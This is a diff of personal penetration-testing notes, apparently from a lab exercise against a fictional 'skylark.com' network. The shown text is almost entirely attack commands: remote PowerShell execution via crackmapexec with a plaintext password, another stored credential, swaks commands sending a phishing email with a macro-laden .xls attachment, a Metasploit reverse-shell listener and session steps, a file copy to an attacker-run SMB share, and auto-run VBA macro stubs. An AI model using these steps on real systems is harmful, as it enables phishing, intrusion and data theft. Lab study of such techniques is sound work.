@@ -541,7 +541,7 @@ crackmapexec smb 10.10.76.13 -u backup_service -p 'It4Server' -X "powershell.exe
 # test - s.ahmed:WelcomeToSkyl4rk!
 sudo swaks -t f.miller@skylark.com --from s.ahmed@skylark.com --server 10.10.84.13 --body "test" --header "Hi" --suppress-data -ap
 
-sudo swaks -t f.miller@skylark.com --from s.ahmed@skylark.com --attach book.xls --server 10.10.84.13 --body @body.txt --header "Expenses" --suppress-data -ap
+sudo swaks -t f.miller@skylark.com --from s.ahmed@skylark.com --attach book.xls --server 10.10.84.13 --body "expenses" --header "Expenses" --suppress-data -ap
 
 # log into winprep
 # need to use the installer from C:\Tools to use microsoft office
@@ -564,15 +564,25 @@ set LHOST 192.168.45.229
 set LPORT 443
 set ExitOnSession false
 run -j
+
+# when connected to from target
+sessions
+sessions -i 1
+shell
+powershell
+
+impacket-smbserver -smb2support smb smb 
+net use \\192.168.45.229\smb
+copy "Book1.xls" \\192.168.45.229\smb
 ```
 
-macro
+macro (name it MyMacro)
 ```
-Sub AutoOpen()
+Sub Auto_Open()
     MyMacro
 End Sub
 
-Sub Document_Open()
+Sub Workbook_Open()
     MyMacro
 End Sub
 
